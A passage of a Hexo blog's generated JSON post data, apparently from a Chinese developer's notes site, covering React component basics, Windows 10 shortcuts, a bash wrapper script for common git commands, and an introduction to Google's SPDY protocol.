class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class App extends Component&#123;</span><br><span class=\"line\">  constructor()&#123;  //（ES6提供方法）</span><br><span class=\"line\">    和 super()结合使用,来继承Compoent的方法</span><br><span class=\"line\">    引入护法 state 状态（数据驱动视图）</span><br><span class=\"line\">    //所有初始化属性都会存放在state</span><br><span class=\"line\">    this.state=&#123;</span><br><span class=\"line\">      count:0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  xxx()&#123;//其他自定义事件&#125;</span><br><span class=\"line\">  &apos;&#123;&#125;&apos;在任何地方都能插值</span><br><span class=\"line\">  render()&#123;   //（React提供方法）</span><br><span class=\"line\">    *React插入事件的方法</span><br><span class=\"line\">    &apos;&#123;&#125;&apos;大括号的用法</span><br><span class=\"line\">    &lt;button onClick=&#123;this.clickHandler&#125;&gt;点我&lt;/button&gt;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  //React里面function的=&gt;(箭头函数)写法能改变this的指向（如果用function会打印出window对象而不是App对象），call()和bind()也可以绑定this</span><br><span class=\"line\">  // 在React中 修改state 不能直接修改 必须通过调用 this.setState()当前组建提供方法</span><br><span class=\"line\">  // 数据驱动视图，当修改state的时候，数据修改如何驱动的视图？当每修改一次state后，render()方法会重新再走一次</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>01.19分分析state和生命周期的匹配与使用</p>\n<p>小心this的指向！</p>\n<p>09-14 02 29分 :<br>插值数组</p>\n","site":{"data":{}},"excerpt":"","more":"<p>React作用：提供jsx的语法糖支持和Component的功能<br>ReactDom作用：渲染虚拟Dom和控制桌面内容<br>ReactDom.render(){渲染虚拟Dom,Element元素}</p>\n<p>核心概念：组件化！<br>组件：创建一个构造函数，使用ES6语法。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class App extends Component&#123;</span><br><span class=\"line\">  constructor()&#123;  //（ES6提供方法）</span><br><span class=\"line\">    和 super()结合使用,来继承Compoent的方法</span><br><span class=\"line\">    引入护法 state 状态（数据驱动视图）</span><br><span class=\"line\">    //所有初始化属性都会存放在state</span><br><span class=\"line\">    this.state=&#123;</span><br><span class=\"line\">      count:0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  xxx()&#123;//其他自定义事件&#125;</span><br><span class=\"line\">  &apos;&#123;&#125;&apos;在任何地方都能插值</span><br><span class=\"line\">  render()&#123;   //（React提供方法）</span><br><span class=\"line\">    *React插入事件的方法</span><br><span class=\"line\">    &apos;&#123;&#125;&apos;大括号的用法</span><br><span class=\"line\">    &lt;button onClick=&#123;this.clickHandler&#125;&gt;点我&lt;/button&gt;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  //React里面function的=&gt;(箭头函数)写法能改变this的指向（如果用function会打印出window对象而不是App对象），call()和bind()也可以绑定this</span><br><span class=\"line\">  // 在React中 修改state 不能直接修改 必须通过调用 this.setState()当前组建提供方法</span><br><span class=\"line\">  // 数据驱动视图，当修改state的时候，数据修改如何驱动的视图？当每修改一次state后，render()方法会重新再走一次</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>01.19分分析state和生命周期的匹配与使用</p>\n<p>小心this的指向！</p>\n<p>09-14 02 29分 :<br>插值数组</p>\n"},{"title":"Windows/系统快捷键","date":"2018-05-05T01:46:01.000Z","archives":"系统快捷键","_content":"# Windows/系统快捷键\n\n## Win10\n> Win + G  // XBOX录屏软件\n\n> Win + shift + 1~9  // 快速建立新窗口/多窗口\n\n> Win + `\"+\"` // 屏幕放大镜\n\n> Win + Esc  // 关闭屏幕放大镜\n","source":"_posts/Windows/Windows-系统快捷键.md","raw":"---\ntitle: Windows/系统快捷键\ndate: 2018-05-05 09:46:01\ntags: Windows/系统快捷键\narchives: 系统快捷键\ncategories: Windows\n---\n# Windows/系统快捷键\n\n## Win10\n> Win + G  // XBOX录屏软件\n\n> Win + shift + 1~9  // 快速建立新窗口/多窗口\n\n> Win + `\"+\"` // 屏幕放大镜\n\n> Win + Esc  // 关闭屏幕放大镜\n","slug":"Windows/Windows-系统快捷键","published":1,"updated":"2018-05-05T02:16:41.181Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nc00021r8xj7e4rgnvf","content":"<h1 id=\"Windows-系统快捷键\"><a href=\"#Windows-系统快捷键\" class=\"headerlink\" title=\"Windows/系统快捷键\"></a>Windows/系统快捷键</h1><h2 id=\"Win10\"><a href=\"#Win10\" class=\"headerlink\" title=\"Win10\"></a>Win10</h2><blockquote>\n<p>Win + G  // XBOX录屏软件</p>\n<p>Win + shift + 1~9  // 快速建立新窗口/多窗口</p>\n<p>Win + <code>&quot;+&quot;</code> // 屏幕放大镜</p>\n<p>Win + Esc  // 关闭屏幕放大镜</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Windows-系统快捷键\"><a href=\"#Windows-系统快捷键\" class=\"headerlink\" title=\"Windows/系统快捷键\"></a>Windows/系统快捷键</h1><h2 id=\"Win10\"><a href=\"#Win10\" class=\"headerlink\" title=\"Win10\"></a>Win10</h2><blockquote>\n<p>Win + G  // XBOX录屏软件</p>\n<p>Win + shift + 1~9  // 快速建立新窗口/多窗口</p>\n<p>Win + <code>&quot;+&quot;</code> // 屏幕放大镜</p>\n<p>Win + Esc  // 关闭屏幕放大镜</p>\n</blockquote>\n"},{"title":"添加自定义shell","date":"2018-05-04T03:34:46.000Z","archives":"shell脚本","_content":"# 添加自定义shell\n````\n$ echo $PATH  // 打印 路径\n$ cd /home/LiSC/bi  // 转到第一个路径\n$ mkdir /home/LiSC/bin  // 创建文件夹\n$ vim github.shell  // 创建文件[把shell脚本复制粘贴]\n$ chmod +x github.shell  // 文件权限属性设置 => 用来变更文件或目录的权限\n````\n\n附：shell\n````\n#!/bin/bash\n## Coptyright 2016 The HongJiang Library Authors. All rights reserved.\n## Use of this source code is governed by a Apache-style\n## license that can be found in the LICNESE file.\n##\n## Git(Github.com) Common Client Commands.\n##\n## @authors hjboss <hongjiangproject@gmail.com> 2018-04 $$\n## @version 1.0.0\nGIT=`/usr/bin/which git`\nHOST='git@github.com'\nNAME='hlibs'\nSCRIPT=`basename $0`\n\ncase \"$1\" in\n\t\"add\")\n\t\tif [ $# -lt 2 ] || [ \"$2\" == \"*\" ]; then\n\t\t\t$GIT add --all\n\t\telse\n\t\t\t$GIT add \"$2\"\n\t\tfi\n\t;;\n\n\t\"ci\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\t$GIT commit -a -m \"Initial commit\"\n\t\telse\n\t\t\t$GIT commit -a -m \"$2\"\n\t\tfi\n\t\t$GIT push -u origin master\n\t;;\n\n\t\"co\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\techo \"版本庫名稱不能空值\"\n\t\telif [ $# -eq 2 ]; then\n\t\t\t$GIT clone \"$HOST:$NAME/$2.git\"\n\t\telse\n\t\t\t$GIT clone \"$HOST:$2/$3.git\"\n\t\tfi\n\t;;\n\n\t\"rm\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\techo \"刪除文件名不能空值\"\n\t\t\texit\n\t\tfi\n\t\t$GIT rm \"$2\"\n\t;;\n\n\t\"up\")\n\t\t$GIT pull\n\t;;\n\n\t\"st\")\n\t\t$GIT status\n\t;;\n\n\t\"help\")\n\t\techo \"用法: $SCRIPT <subcommand> [args]\"\n\t\techo \"版本: 1.0.0\"\n\t\techo \"最常用的子命令:\"\n\t\techo \"  add 添加文件内容至索引\"\n\t\techo \"  ci 记录变更到版本库并且更新至github.com\"\n\t\techo \"  co 将给定名称的版本库克隆到一个新目录\"\n\t\techo \"  rm 从工作区和索引中删除文件\"\n\t\techo \"  up 本地分支更新到最新版本\"\n\t\techo \"  st 显示工作区状态\"\n\t;;\n\n\t\"version\")\n\t\techo \"$SCRIPT version 1.0.0\"\n\t;;\n\n\t*)\n\t\techo \"使用$SCRIPT help得到用法\"\n\t;;\nesac\n````","source":"_posts/Linux/添加自定义shell.md","raw":"---\ntitle: 添加自定义shell\ndate: 2018-05-04 11:34:46\ntags: 自定义shell\narchives: shell脚本\ncategories: shell\n---\n# 添加自定义shell\n````\n$ echo $PATH  // 打印 路径\n$ cd /home/LiSC/bi  // 转到第一个路径\n$ mkdir /home/LiSC/bin  // 创建文件夹\n$ vim github.shell  // 创建文件[把shell脚本复制粘贴]\n$ chmod +x github.shell  // 文件权限属性设置 => 用来变更文件或目录的权限\n````\n\n附：shell\n````\n#!/bin/bash\n## Coptyright 2016 The HongJiang Library Authors. All rights reserved.\n## Use of this source code is governed by a Apache-style\n## license that can be found in the LICNESE file.\n##\n## Git(Github.com) Common Client Commands.\n##\n## @authors hjboss <hongjiangproject@gmail.com> 2018-04 $$\n## @version 1.0.0\nGIT=`/usr/bin/which git`\nHOST='git@github.com'\nNAME='hlibs'\nSCRIPT=`basename $0`\n\ncase \"$1\" in\n\t\"add\")\n\t\tif [ $# -lt 2 ] || [ \"$2\" == \"*\" ]; then\n\t\t\t$GIT add --all\n\t\telse\n\t\t\t$GIT add \"$2\"\n\t\tfi\n\t;;\n\n\t\"ci\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\t$GIT commit -a -m \"Initial commit\"\n\t\telse\n\t\t\t$GIT commit -a -m \"$2\"\n\t\tfi\n\t\t$GIT push -u origin master\n\t;;\n\n\t\"co\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\techo \"版本庫名稱不能空值\"\n\t\telif [ $# -eq 2 ]; then\n\t\t\t$GIT clone \"$HOST:$NAME/$2.git\"\n\t\telse\n\t\t\t$GIT clone \"$HOST:$2/$3.git\"\n\t\tfi\n\t;;\n\n\t\"rm\")\n\t\tif [ $# -lt 2 ]; then\n\t\t\techo \"刪除文件名不能空值\"\n\t\t\texit\n\t\tfi\n\t\t$GIT rm \"$2\"\n\t;;\n\n\t\"up\")\n\t\t$GIT pull\n\t;;\n\n\t\"st\")\n\t\t$GIT status\n\t;;\n\n\t\"help\")\n\t\techo \"用法: $SCRIPT <subcommand> [args]\"\n\t\techo \"版本: 1.0.0\"\n\t\techo \"最常用的子命令:\"\n\t\techo \"  add 添加文件内容至索引\"\n\t\techo \"  ci 记录变更到版本库并且更新至github.com\"\n\t\techo \"  co 将给定名称的版本库克隆到一个新目录\"\n\t\techo \"  rm 从工作区和索引中删除文件\"\n\t\techo \"  up 本地分支更新到最新版本\"\n\t\techo \"  st 显示工作区状态\"\n\t;;\n\n\t\"version\")\n\t\techo \"$SCRIPT version 1.0.0\"\n\t;;\n\n\t*)\n\t\techo \"使用$SCRIPT help得到用法\"\n\t;;\nesac\n````","slug":"Linux/添加自定义shell","published":1,"updated":"2018-05-05T02:20:23.044Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nc10024r8xj11f5yddt","content":"<h1 id=\"添加自定义shell\"><a href=\"#添加自定义shell\" class=\"headerlink\" title=\"添加自定义shell\"></a>添加自定义shell</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ echo $PATH  // 打印 路径</span><br><span class=\"line\">$ cd /home/LiSC/bi  // 转到第一个路径</span><br><span class=\"line\">$ mkdir /home/LiSC/bin  // 创建文件夹</span><br><span class=\"line\">$ vim github.shell  // 创建文件[把shell脚本复制粘贴]</span><br><span class=\"line\">$ chmod +x github.shell  // 文件权限属性设置 =&gt; 用来变更文件或目录的权限</span><br></pre></td></tr></table></figure>\n<p>附：shell<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">## Coptyright 2016 The HongJiang Library Authors. All rights reserved.</span><br><span class=\"line\">## Use of this source code is governed by a Apache-style</span><br><span class=\"line\">## license that can be found in the LICNESE file.</span><br><span class=\"line\">##</span><br><span class=\"line\">## Git(Github.com) Common Client Commands.</span><br><span class=\"line\">##</span><br><span class=\"line\">## @authors hjboss &lt;hongjiangproject@gmail.com&gt; 2018-04 $$</span><br><span class=\"line\">## @version 1.0.0</span><br><span class=\"line\">GIT=`/usr/bin/which git`</span><br><span class=\"line\">HOST=&apos;git@github.com&apos;</span><br><span class=\"line\">NAME=&apos;hlibs&apos;</span><br><span class=\"line\">SCRIPT=`basename $0`</span><br><span class=\"line\"></span><br><span class=\"line\">case &quot;$1&quot; in</span><br><span class=\"line\">\t&quot;add&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ] || [ &quot;$2&quot; == &quot;*&quot; ]; then</span><br><span class=\"line\">\t\t\t$GIT add --all</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT add &quot;$2&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;ci&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\t$GIT commit -a -m &quot;Initial commit&quot;</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT commit -a -m &quot;$2&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t\t$GIT push -u origin master</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;co&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\techo &quot;版本庫名稱不能空值&quot;</span><br><span class=\"line\">\t\telif [ $# -eq 2 ]; then</span><br><span class=\"line\">\t\t\t$GIT clone &quot;$HOST:$NAME/$2.git&quot;</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT clone &quot;$HOST:$2/$3.git&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;rm&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\techo &quot;刪除文件名不能空值&quot;</span><br><span class=\"line\">\t\t\texit</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t\t$GIT rm &quot;$2&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;up&quot;)</span><br><span class=\"line\">\t\t$GIT pull</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;st&quot;)</span><br><span class=\"line\">\t\t$GIT status</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;help&quot;)</span><br><span class=\"line\">\t\techo &quot;用法: $SCRIPT &lt;subcommand&gt; [args]&quot;</span><br><span class=\"line\">\t\techo &quot;版本: 1.0.0&quot;</span><br><span class=\"line\">\t\techo &quot;最常用的子命令:&quot;</span><br><span class=\"line\">\t\techo &quot;  add 添加文件内容至索引&quot;</span><br><span class=\"line\">\t\techo &quot;  ci 记录变更到版本库并且更新至github.com&quot;</span><br><span class=\"line\">\t\techo &quot;  co 将给定名称的版本库克隆到一个新目录&quot;</span><br><span class=\"line\">\t\techo &quot;  rm 从工作区和索引中删除文件&quot;</span><br><span class=\"line\">\t\techo &quot;  up 本地分支更新到最新版本&quot;</span><br><span class=\"line\">\t\techo &quot;  st 显示工作区状态&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;version&quot;)</span><br><span class=\"line\">\t\techo &quot;$SCRIPT version 1.0.0&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t*)</span><br><span class=\"line\">\t\techo &quot;使用$SCRIPT help得到用法&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\">esac</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"添加自定义shell\"><a href=\"#添加自定义shell\" class=\"headerlink\" title=\"添加自定义shell\"></a>添加自定义shell</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ echo $PATH  // 打印 路径</span><br><span class=\"line\">$ cd /home/LiSC/bi  // 转到第一个路径</span><br><span class=\"line\">$ mkdir /home/LiSC/bin  // 创建文件夹</span><br><span class=\"line\">$ vim github.shell  // 创建文件[把shell脚本复制粘贴]</span><br><span class=\"line\">$ chmod +x github.shell  // 文件权限属性设置 =&gt; 用来变更文件或目录的权限</span><br></pre></td></tr></table></figure>\n<p>附：shell<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">## Coptyright 2016 The HongJiang Library Authors. All rights reserved.</span><br><span class=\"line\">## Use of this source code is governed by a Apache-style</span><br><span class=\"line\">## license that can be found in the LICNESE file.</span><br><span class=\"line\">##</span><br><span class=\"line\">## Git(Github.com) Common Client Commands.</span><br><span class=\"line\">##</span><br><span class=\"line\">## @authors hjboss &lt;hongjiangproject@gmail.com&gt; 2018-04 $$</span><br><span class=\"line\">## @version 1.0.0</span><br><span class=\"line\">GIT=`/usr/bin/which git`</span><br><span class=\"line\">HOST=&apos;git@github.com&apos;</span><br><span class=\"line\">NAME=&apos;hlibs&apos;</span><br><span class=\"line\">SCRIPT=`basename $0`</span><br><span class=\"line\"></span><br><span class=\"line\">case &quot;$1&quot; in</span><br><span class=\"line\">\t&quot;add&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ] || [ &quot;$2&quot; == &quot;*&quot; ]; then</span><br><span class=\"line\">\t\t\t$GIT add --all</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT add &quot;$2&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;ci&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\t$GIT commit -a -m &quot;Initial commit&quot;</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT commit -a -m &quot;$2&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t\t$GIT push -u origin master</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;co&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\techo &quot;版本庫名稱不能空值&quot;</span><br><span class=\"line\">\t\telif [ $# -eq 2 ]; then</span><br><span class=\"line\">\t\t\t$GIT clone &quot;$HOST:$NAME/$2.git&quot;</span><br><span class=\"line\">\t\telse</span><br><span class=\"line\">\t\t\t$GIT clone &quot;$HOST:$2/$3.git&quot;</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;rm&quot;)</span><br><span class=\"line\">\t\tif [ $# -lt 2 ]; then</span><br><span class=\"line\">\t\t\techo &quot;刪除文件名不能空值&quot;</span><br><span class=\"line\">\t\t\texit</span><br><span class=\"line\">\t\tfi</span><br><span class=\"line\">\t\t$GIT rm &quot;$2&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;up&quot;)</span><br><span class=\"line\">\t\t$GIT pull</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;st&quot;)</span><br><span class=\"line\">\t\t$GIT status</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;help&quot;)</span><br><span class=\"line\">\t\techo &quot;用法: $SCRIPT &lt;subcommand&gt; [args]&quot;</span><br><span class=\"line\">\t\techo &quot;版本: 1.0.0&quot;</span><br><span class=\"line\">\t\techo &quot;最常用的子命令:&quot;</span><br><span class=\"line\">\t\techo &quot;  add 添加文件内容至索引&quot;</span><br><span class=\"line\">\t\techo &quot;  ci 记录变更到版本库并且更新至github.com&quot;</span><br><span class=\"line\">\t\techo &quot;  co 将给定名称的版本库克隆到一个新目录&quot;</span><br><span class=\"line\">\t\techo &quot;  rm 从工作区和索引中删除文件&quot;</span><br><span class=\"line\">\t\techo &quot;  up 本地分支更新到最新版本&quot;</span><br><span class=\"line\">\t\techo &quot;  st 显示工作区状态&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&quot;version&quot;)</span><br><span class=\"line\">\t\techo &quot;$SCRIPT version 1.0.0&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t*)</span><br><span class=\"line\">\t\techo &quot;使用$SCRIPT help得到用法&quot;</span><br><span class=\"line\">\t;;</span><br><span class=\"line\">esac</span><br></pre></td></tr></table></figure></p>\n"},{"title":"SPDY：Google开发的下一代HTTP协议","date":"2018-05-03T06:46:47.000Z","archives":"HTTP协议","_content":"# [SPDY(发音同\"speedy\")：Google开发的下一代HTTP协议](http://josh-persistence.iteye.com/blog/2200727)\n\n（解决HTTP协议的缺点,Wrapper模式）\n\n概述\n\nSPDY是Google宣布正在开发的下一代网络协议，SPDY并不是一种用于替代HTTP的协议，而是对HTTP协议的增强。HTTP自上世纪90年代问世以来，已有二十年的历史，期间互联网本身发生了很大的变化，也使得HTTP的许多不足暴露了出来，现在它已经不能满足许多web app的要求。Google表示，引入SPDY协议后，在实验室测试中页面加载速度比原先快64%，并且目前已经在Gmail等应用中使用。目前业界支持SPDY的服务器有Netty和Nginx(将要支持)。Nginx 官方发布下一个版本 1.3.0 的路线图，该版本将支持 Google SPDY。","source":"_posts/SPDY：Google开发的下一代HTTP协议.md","raw":"---\ntitle: SPDY：Google开发的下一代HTTP协议\ndate: 2018-05-03 14:46:47\ntags: SPDY\narchives: HTTP协议\ncategories: HTTP\n---\n# [SPDY(发音同\"speedy\")：Google开发的下一代HTTP协议](http://josh-persistence.iteye.com/blog/2200727)\n\n（解决HTTP协议的缺点,Wrapper模式）\n\n概述\n\nSPDY是Google宣布正在开发的下一代网络协议，SPDY并不是一种用于替代HTTP的协议，而是对HTTP协议的增强。HTTP自上世纪90年代问世以来，已有二十年的历史，期间互联网本身发生了很大的变化，也使得HTTP的许多不足暴露了出来，现在它已经不能满足许多web app的要求。Google表示，引入SPDY协议后，在实验室测试中页面加载速度比原先快64%，并且目前已经在Gmail等应用中使用。目前业界支持SPDY的服务器有Netty和Nginx(将要支持)。Nginx 官方发布下一个版本 1.3.0 的路线图，该版本将支持 Google SPDY。","slug":"SPDY：Google开发的下一代HTTP协议","published":1,"updated":"2018-05-03T06:49:19.767Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nc20028r8xjxf8gii7s","content":"<h1 id=\"SPDY-发音同”speedy”-：Google开发的下一代HTTP协议\"><a href=\"#SPDY-发音同”speedy”-：Google开发的下一代HTTP协议\" class=\"headerlink\" title=\"SPDY(发音同”speedy”)：Google开发的下一代HTTP协议\"></a><a href=\"http://josh-persistence.iteye.com/blog/2200727\" target=\"_blank\" rel=\"noopener\">SPDY(发音同”speedy”)：Google开发的下一代HTTP协议</a></h1><p>（解决HTTP协议的缺点,Wrapper模式）</p>\n<p>概述</p>\n<p>SPDY是Google宣布正在开发的下一代网络协议，SPDY并不是一种用于替代HTTP的协议，而是对HTTP协议的增强。HTTP自上世纪90年代问世以来，已有二十年的历史，期间互联网本身发生了很大的变化，也使得HTTP的许多不足暴露了出来，现在它已经不能满足许多web app的要求。Google表示，引入SPDY协议后，在实验室测试中页面加载速度比原先快64%，并且目前已经在Gmail等应用中使用。目前业界支持SPDY的服务器有Netty和Nginx(将要支持)。Nginx 官方发布下一个版本 1.3.0 的路线图，该版本将支持 Google SPDY。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"SPDY-发音同”speedy”-：Google开发的下一代HTTP协议\"><a href=\"#SPDY-发音同”speedy”-：Google开发的下一代HTTP协议\" class=\"headerlink\" 